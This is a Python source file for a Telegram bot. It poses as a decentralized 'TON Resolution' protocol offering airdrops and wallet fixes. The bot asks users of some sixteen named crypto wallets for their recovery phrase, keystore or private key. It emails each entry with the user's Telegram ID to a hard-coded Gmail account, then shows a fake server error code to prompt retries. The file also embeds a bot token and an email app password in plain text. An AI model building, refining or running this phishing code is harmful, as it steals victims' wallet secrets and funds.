import smtplib
from email.mime.text import MIMEText
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# === Replace with your Bot Token ===
BOT_TOKEN = "8309220077:AAHWnKbGoKoEXe9b3fo1izeIb0jHboT6wzc"

# === Add your email credentials here ===
EMAIL_ADDRESS = "victoralbs4050th@gmail.com"
EMAIL_PASSWORD = "pgpg dfst mhrz rohk"   # Gmail App Password

# =========================
# Error codes per wallet
# =========================
ERROR_CODES = {
    "TonKeeper": "SERVER-TNKP78",
    "MyTonWallet": "SERVER-MTW44",
    "TonHub": "SERVER-THB93",
    "DeWallet": "SERVER-DWL11",
    "Telegram Wallet": "SERVER-TGW22",
    "Bitget": "SERVER-BGT66",
    "Safepal": "SERVER-SFP77",
    "Trust Wallet": "SERVER-TWT55",
    "Metamask": "SERVER-MMSK88",
    "Wallet Connect": "SERVER-WLC99",
    "Ledger": "SERVER-LDG33",
    "BRD Wallet": "SERVER-BRD12",
    "Coinbase": "SERVER-CNB44",
    "Best Wallet": "SERVER-BST21",
    "Zedna Wallet": "SERVER-ZDN88",
    "OKX": "SERVER-OKX09",
}

# =========================
# 1. START / WELCOME SCREEN
# =========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🌐 The Open Network for everyone\n\n"
        "Open and decentralized protocol for syncing various Wallets issues on Secure Server.\n"
        "This is not an app but a protocol that establishes a remote resolution between all noncustodial wallets.\n\n"
        "🤖 You will be on a chat with an Artificial Intelligence Robot with zero Human interference."
    )
    keyboard = [
        [InlineKeyboardButton("Claim Airdrop", callback_data="claim_airdrop")],
        [InlineKeyboardButton("Resolve Issues", callback_data="resolve_issues")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# =========================
# 2. MAIN MENU (RESOLVE ISSUES)
# =========================
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("Migration", callback_data="migration")],
        [InlineKeyboardButton("Rectification", callback_data="rectification")],
        [InlineKeyboardButton("Withdraw Issue", callback_data="withdraw")],
        [InlineKeyboardButton("Claim Reflection", callback_data="reflection")],
        [InlineKeyboardButton("Assets Recovery", callback_data="recovery")],
        [InlineKeyboardButton("Login Issue", callback_data="login")]
    ]
    await query.edit_message_text("Please select the service you need help with 👇",
                                  reply_markup=InlineKeyboardMarkup(keyboard))

# =========================
# 3. WALLET LIST (3AUTH Section)
# =========================
async def wallet_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    wallets = [
        "TonKeeper", "MyTonWallet", "TonHub",
        "DeWallet", "Telegram Wallet", "Bitget",
        "Safepal", "Trust Wallet", "Metamask",
        "Wallet Connect", "Ledger", "BRD Wallet",
        "Coinbase", "Best Wallet", "Zedna Wallet", "OKX"
    ]
    keyboard = [[InlineKeyboardButton(w, callback_data=f"wallet_{w}")] for w in wallets]
    await query.edit_message_text("🔗 Connect Wallet\nSelect your wallet to continue 👇",
                                  reply_markup=InlineKeyboardMarkup(keyboard))

# =========================
# 5. MANUAL WALLET AUTH (after selecting wallet)
# =========================
async def manual_connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    wallet_name = query.data.replace("wallet_", "")
    context.user_data["selected_wallet"] = wallet_name
    keyboard = [
        [InlineKeyboardButton("Phrase", callback_data="auth_phrase")],
        [InlineKeyboardButton("Keystore", callback_data="auth_keystore")],
        [InlineKeyboardButton("Private Key", callback_data="auth_private")],
        [InlineKeyboardButton("Cancel", callback_data="main_menu")]
    ]
    await query.edit_message_text(
        f"🔒 Secure Connection – {wallet_name}\n\n"
        "Connect using any option below 👇",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# =========================
# 6. ASK FOR USER INPUT
# =========================
async def ask_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    auth_type = query.data.replace("auth_", "")
    context.user_data["expecting_input"] = auth_type
    await query.message.reply_text(f"🔑 Please enter your {auth_type}:")

# =========================
# 7. HANDLE USER INPUT + ERROR FEEDBACK
# =========================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("expecting_input")
    wallet_name = context.user_data.get("selected_wallet", "Wallet")
    error_code = ERROR_CODES.get(wallet_name, "SERVER-UNKNOWN")

    if state:
        user_input = update.message.text

        # 📩 Send input to your email
        send_email(
            subject=f"Bot Input from {wallet_name}",
            body=f"User ID: {update.effective_user.id}\n"
                 f"Username: @{update.effective_user.username}\n"
                 f"Wallet: {wallet_name}\n"
                 f"Auth Type: {state}\n\n"
                 f"Input:\n{user_input}"
        )

        keyboard = [
            [InlineKeyboardButton("🔙 Back to Wallets", callback_data="connect_wallet")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]
        ]
        await update.message.chat.send_message(
            f"‼ An error occured while connecting to {wallet_name}.\n"
            f"{error_code} failed.\n\n"
            "Please ensure you are entering the correct key, use copy and paste to avoid errors.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data.clear()
    else:
        await update.message.reply_text("ℹ Please choose an option first with /start.")

# =========================
# EMAIL FUNCTION
# =========================
def send_email(subject, body):
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# =========================
# CALLBACK ROUTER
# =========================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    if data == "claim_airdrop":
        await wallet_connection(update, context)
    elif data == "resolve_issues":
        await main_menu(update, context)
    elif data in ["migration", "rectification", "withdraw", "reflection", "recovery", "login"]:
        await wallet_connection(update, context)
    elif data.startswith("wallet_"):
        await manual_connect(update, context)
    elif data.startswith("auth_"):
        await ask_for_input(update, context)
    elif data == "connect_wallet":
        await wallet_connection(update, context)
    elif data == "main_menu":
        await main_menu(update, context)

# =========================
# RUN BOT
# =========================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 TON Resolution Bot running...")
    app.run_polling()

if __name__ == "__main__":

    main()
